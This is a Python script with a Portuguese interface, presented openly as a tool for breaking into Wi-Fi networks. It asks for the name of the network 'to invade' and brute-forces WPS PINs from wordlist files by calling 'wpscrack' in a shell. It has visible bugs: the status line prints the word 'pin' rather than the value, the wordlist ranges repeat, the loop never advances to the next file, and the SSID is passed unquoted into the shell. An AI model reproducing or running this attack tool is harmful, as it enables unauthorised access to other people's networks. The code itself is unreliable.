import time
import os
import netifaces
import subprocess
os.system("clear")
vermelho = '\033[31m'
verde = '\033[32m'
ciano = '\033[36m'
magenta = '\033[35m'
amarelo = '\033[33m'
branco = '\033[37m'
print("\033[36m         _.-.")
print("       ,'/ //\ ")
print("      /// // /) ")
print("     /// // //| ")
print("    /// // /// ")
print("   /// // /// ")
print("  (`: // /// ")
print("   `;`: /// ")
print("\033[33m   / /"+"\033[36m:`:/")
print("\033[33m  / /"+"\033[36m  `'")
print("\033[33m / /")
print("(_/  ")
print(ciano+"\n.  ..__  __..                  , ")
print(ciano+"|  |[__)(__ |_    __ _.._.*._ -+- ")
print(ciano+"|/\||   .__)[ )  _) (_.[  |[_) | "+magenta+"Eu te amo amor S2")
                              

def get_wifi_interface():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if "wlan" in interface:
            return interface
    return None
wifi_interface = get_wifi_interface()
time.sleep(1)
if wifi_interface:
    print(ciano)
    print(f"Nome da interface Wi-Fi: {wifi_interface}"+magenta+" (coloque a baixo)")
else:
    print(vermelho+"Nenhuma interface Wi-Fi encontrada.")
time.sleep(1)
print("\n")
print(ciano+"["+magenta+"1"+ciano+"]"+branco+" 10M - 15M  "+ciano+"["+magenta+"10"+ciano+"]"+branco+" 55M - 60M")
print(ciano+"["+magenta+"2"+ciano+"]"+branco+" 15M - 20M  "+ciano+"["+magenta+"11"+ciano+"]"+branco+" 60M - 65M")
print(ciano+"["+magenta+"3"+ciano+"]"+branco+" 10M - 15M  "+ciano+"["+magenta+"12"+ciano+"]"+branco+" 55M - 60M")
print(ciano+"["+magenta+"4"+ciano+"]"+branco+" 15M - 20M  "+ciano+"["+magenta+"13"+ciano+"]"+branco+" 60M - 65M")
print(ciano+"["+magenta+"5"+ciano+"]"+branco+" 10M - 15M  "+ciano+"["+magenta+"14"+ciano+"]"+branco+" 55M - 60M")
print(ciano+"["+magenta+"6"+ciano+"]"+branco+" 15M - 20M  "+ciano+"["+magenta+"15"+ciano+"]"+branco+" 60M - 65M")
print(ciano+"["+magenta+"7"+ciano+"]"+branco+" 10M - 15M  "+ciano+"["+magenta+"16"+ciano+"]"+branco+" 55M - 60M")
print(ciano+"["+magenta+"8"+ciano+"]"+branco+" 15M - 20M  "+ciano+"["+magenta+"17"+ciano+"]"+branco+" 60M - 65M")
print(ciano+"["+magenta+"9"+ciano+"]"+branco+" 50M - 55M")
print("\n")
print(ciano+"Digite onde você deseja começar.")
n=int(input(ciano+"["+magenta+"~"+ciano+"] "+magenta))
s=str(n)
print(ciano+"Qual o nome da rede que deseja invadir? ")
ssid = input(ciano+"["+magenta+"~"+ciano+"] "+magenta)
while True:
    pins_file = "wordlistofc"+s+".txt"
    def connect_wifi(pin):
        command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout

    def main():
        with open(pins_file, "r") as file:
            pins = file.readlines()
            for pin in pins:
                pin = pin.strip()
                os.system("clear")
                print("Testando PIN: "+ciano+"pin")
                result = connect_wifi(pin)
                if "SUCCESS" in result:
                    print(verde)
                    print(f"Successo! PIN: {pin}")
                    exit()
                else:
                    print(amarelo+"PIN inválido")

    if __name__ == "__main__":
        main()
        n=n+1
